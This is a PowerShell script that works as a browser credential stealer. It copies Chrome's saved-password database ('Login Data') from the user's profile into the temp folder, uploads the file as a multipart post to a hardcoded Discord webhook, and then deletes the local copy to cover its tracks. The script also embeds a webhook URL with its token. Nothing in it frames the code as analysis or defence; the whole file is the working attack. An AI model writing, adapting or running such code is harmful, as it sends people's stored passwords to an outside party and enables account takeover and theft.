# Define the Discord Webhook URL
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function to extract raw encoded passwords and save to a new SQLite .db file
function Extract-And-ExportToDB {
    param (
        [string]$chromeLoginDataPath,
        [string]$outputDbPath
    )

    # Check if the Login Data file exists
    if (-not (Test-Path $chromeLoginDataPath)) {
        Write-Host "Login Data file not found: $chromeLoginDataPath"
        return
    }

    try {
        # Open the Login Data file as binary data (it is an SQLite DB)
        $fileBytes = [System.IO.File]::ReadAllBytes($chromeLoginDataPath)

        # Write the raw data to the new SQLite DB file
        [System.IO.File]::WriteAllBytes($outputDbPath, $fileBytes)
        Write-Host "Raw encoded data exported to SQLite DB file: $outputDbPath"
    } catch {
        Write-Host "Error extracting and exporting data: $_"
    }
}

# Function for uploading files to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        $LF,
        [System.Text.Encoding]::ASCII.GetString($fileBytes),
        "--$boundary--",
        $LF
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        # Send the file to Discord via webhook
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
        Write-Host "File uploaded successfully."
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$loginDataPath = "$chromePath\Default\Login Data"
if (-not (Test-Path $loginDataPath)) {
    Send-DiscordMessage -message "Chrome Login Data not found!"
    exit
}

# Define the output path for the restored SQLite DB
$outputDbFile = "$env:TEMP\chrome_login_data.db"

# Extract and export the raw encoded passwords (and database structure) to a new .db file
Extract-And-ExportToDB -chromeLoginDataPath $loginDataPath -outputDbPath $outputDbFile

# Upload the restored SQLite DB file to Discord
Upload-FileToDiscord -filePath $outputDbFile

# Optionally, remove the .db file after uploading
Remove-Item $outputDbFile
